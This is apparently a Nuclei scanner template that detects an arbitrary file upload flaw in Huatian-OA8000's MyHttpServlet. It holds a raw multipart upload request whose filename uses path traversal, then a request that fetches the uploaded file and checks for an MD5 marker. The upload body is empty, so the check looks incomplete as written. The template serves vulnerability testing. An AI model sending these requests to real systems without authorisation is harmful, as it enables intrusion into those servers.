id: huatian-oa8000-file-upload
info:
  name: Huatian-OA8000 MyHttpServlet Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Huatian-OA8000 contains an arbitrary file upload vulnerability in the MyHttpServlet component. Attackers can upload malicious files and execute arbitrary SQL statements to retrieve sensitive information.
  tags: file-upload, sql-injection
http:
  - raw:
      - |
        POST /OAapp/MyHttpServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=9b0af0d79eaea67c3aa1889b0b43a50a

        --9b0af0d79eaea67c3aa1889b0b43a50a
        Content-Disposition: form-data; name="file"; filename="\\Temp\\../../../report/reportFiles/{{randstr_6}}.jpg"

        
        --9b0af0d79eaea67c3aa1889b0b43a50a--
    extractors:
      - type: regex
        name: randfile
        part: header
        regex:
          - "filename=\\\\Temp\\\\..*?/(.*?)\\.jpg"
        internal: true
  - raw:
      - |
        GET /report/reportJsp/showHTReport.jsp?reportFile={{randfile}}.jpg HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "c4ca4238a0b923820dcc509a6f75849b"
